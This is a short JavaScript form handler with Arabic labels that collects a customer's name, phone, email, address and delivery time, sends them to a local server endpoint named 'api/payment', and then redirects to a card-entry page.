document.getElementById("loginot2").addEventListener("click", function () {
    window.location.href = "index.html";
  });
  
  document.getElementById("form1").addEventListener("submit", function (e) {
    e.preventDefault();
  
    const name = document.getElementById("userName").value.trim();
    const phone = this.phone.value.trim();
    const email = this.email.value.trim();
    const address1 = document.getElementById("address1").value.trim();
    const address2 = document.getElementById("address2").value.trim();
    const deliveryTime = this.delivery_time.value;
  
    // تخزين الاسم في localStorage
    localStorage.setItem("userName", name);
  
    const message = `
📥 <b>زبون جديد</b>
<b>👤 الاسم:</b> ${name}
<b>📞 الهاتف:</b> ${phone}
<b>📧 البريد الإلكتروني:</b> ${email}
<b>📍 العنوان:</b> ${address1}
<b>🏙️ المحافظة:</b> ${address2}
<b>⏰ موعد التوصيل:</b> ${deliveryTime}
    `;
  
    // ✅ إرسال إلى الخادم المحلي
    fetch('http://localhost:3000/api/payment', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: name,
        phone: phone,
        email: email,
        address: address1,
        city: address2,
        deliveryTime: deliveryTime,
        message: message,
        type: 'customer_form'
      })
    })
      .then(response => {
        if (response.ok) {
          window.location.href = "visacard.html";
        } else {
          alert("فشل في إرسال البيانات.");
        }
      })
      .catch(error => {
        console.error("⚠️ خطأ في الاتصال:", error);
        alert("حدث خطأ أثناء الإرسال.");
      });
  });
  